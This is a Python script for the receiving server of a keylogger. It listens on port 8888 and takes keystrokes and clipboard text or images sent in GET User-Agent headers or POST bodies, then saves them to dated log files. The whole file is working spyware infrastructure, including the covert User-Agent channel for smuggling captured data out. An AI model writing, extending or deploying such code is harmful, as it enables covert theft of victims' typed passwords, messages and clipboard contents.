import base64
import http.server
import socketserver
from PIL import Image
from datetime import datetime
import io

def decode_base64_to_bmp(data:str)->bytes:  
    # Decode the base64 data
    bmp_data = base64.b64decode(data)
    return bmp_data

def convert_bmp_to_jpeg(bmp_data:bytes,file_name:str) -> None:
    # Open the BMP image from the byte data
    image = Image.open(io.BytesIO(bmp_data))
    # Convert and save the image as JPEG
    image.convert("RGB").save(f"log/clipboard/images/{file_name}.jpg", "JPEG")

def save_to_file(data:str, location:str, file_name:str, mode:str='a',separator:str='\n') -> None:
    with open(location+file_name, mode) as file:
        file.write(data+separator)
    file.close()

def process_received_data(data):

    type_log, data = data.split(':',1)
    if type_log == 'clipboard':
        type_data, data = data.split(':',1)
        if type_data == 'text':
            file_name = 'clipboard_text' + datetime.now().strftime('%Y-%m-%d') + '.txt'
            save_to_file(data,'log/clipboard/text/',file_name,'a','\n'+'-'*50+'\n')
        elif type_data == 'image':
            file_name = 'clipboard_image' + datetime.now().strftime('%Y-%m-%d %H-%M-%S')
            convert_bmp_to_jpeg(decode_base64_to_bmp(data),file_name)
    elif type_log == 'keystroke':
        file_name = 'keystroke_' + datetime.now().strftime('%Y-%m-%d') + '.txt'
        save_to_file(data, 'log/keystroke/', file_name,'a','')
        

class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ex_str = self.headers['User-Agent']
        try:
            data = process_received_data(ex_str)
        except:
            pass
        # Send a 200 OK response
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_POST(self):
        # Read the content length
        content_length = int(self.headers['Content-Length'])
        # Read the body of the request
        post_data = self.rfile.read(content_length).decode('utf-8')
        try:
            process_received_data(post_data)
        except:
            pass
        # Send a 200 OK response
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

# Define the server and bind it to the IP and port
PORT = 8888
Handler = MyHttpRequestHandler

with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()

